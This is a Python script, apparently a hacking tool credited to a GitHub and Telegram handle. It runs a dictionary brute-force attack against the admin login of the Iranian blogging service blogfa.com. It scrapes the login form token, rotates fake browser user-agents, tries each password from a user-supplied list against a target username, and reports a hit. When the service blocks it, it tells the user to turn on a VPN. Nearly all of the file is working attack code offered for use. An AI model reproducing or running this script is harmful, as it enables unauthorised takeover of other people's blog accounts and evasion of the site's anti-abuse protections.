import os
from platform import uname as name
from random import choice
from bs4 import BeautifulSoup 
try:from requests import post, get
except:os.system("pip install requests")
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
def clear():
    if 'Windows' in name():
        os.system('cls')
        try:from colorama import init
        except:os.system("pip install colorama")
        init()
    elif 'Linux' in name():
        os.system('clear')
clear()
print (f"""{lgn}

### ##   ### ###  ### ##    ## ##   ### ##   #### ##  
 ##  ##   ##  ##   ##  ##  ##   ##   ##  ##  # ## ##  
 ##  ##   ##       ##  ##  ##   ##   ##  ##    ##     
 ## ##    ## ##    ##  ##  ##   ##   ## ##     ##     
 ## ##    ##       ## ##   ##   ##   ## ##     ##     
 ##  ##   ##  ##   ##      ##   ##   ##  ##    ##     
#### ##  ### ###  ####      ## ##   #### ##   ####   {lrd} 
                                                      
### ##   ####      ## ##    ## ##   ### ###    ##     
 ##  ##   ##      ##   ##  ##   ##   ##  ##     ##    
 ##  ##   ##      ##   ##  ##        ##       ## ##   
 ## ##    ##      ##   ##  ##  ###   ## ##    ##  ##  
 ##  ##   ##      ##   ##  ##   ##   ##       ## ###  
 ##  ##   ##  ##  ##   ##  ##   ##   ##       ##  ##  
### ##   ### ###   ## ##    ## ##   ####     ###  ##
                                                                                                           

                                    {lrd}github : {lgn}github.com/esfelurm

                                    

                                    {lrd}channel telegram : {lgn}@esfelurm""")

PASSWORD = input(f"{lrd}[{yw}PASS{lrd}] Enter name password list : {lgn} ")
TARGET = input(f"{lrd}---------------------------------------\n\n{lrd}[{yw}URL{lrd}] Enter url TARGET : {lgn}")
user_agent = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1","Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",]
heder = {'Host': 'blogfa.com',
'User-Agent': choice(user_agent),
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '175',
'Origin': 'https://blogfa.com',
'Connection': 'keep-alive',
'Referer': 'https://blogfa.com/desktop/login.aspx?r=637860193478105692',
'Upgrade-Insecure-Requests': '1',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache'}
info = BeautifulSoup(get('https://blogfa.com/desktop/login.aspx').text, 'html.parser')
token = info.find('input')['value']
for ent_pas in open(PASSWORD, 'r').read().split():   
    testing = post('https://blogfa.com/desktop/login.aspx', data={"_tt":token,"usrid":TARGET,"ups":ent_pas,"btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}, headers=heder).text
    if 'کلمه عبور را اشتباه وارد کرده اید' in testing:
        print (f"{yw}[{lrd}NO{yw}]{pe} The password is wrong :{lrd} ", ent_pas,"\n")
    if 'در حال حاضر به دلیل حفظ امنیت کاربران امکان ورود به بخش مدیریت را ندارید' in testing:
        print(f"{lrd}[{yw}ERROR{lrd}]{lgn} You have been blocked by blogfa services! Please turn on the VPN and then start ")
        exit()
    if 'کلمه عبور را اشتباه وارد کرده اید' not in testing:
        print(f"{lrd}[{lgn}√{lrd}] {lgn} Password True : {gn}{ent_pas}")
        exit()
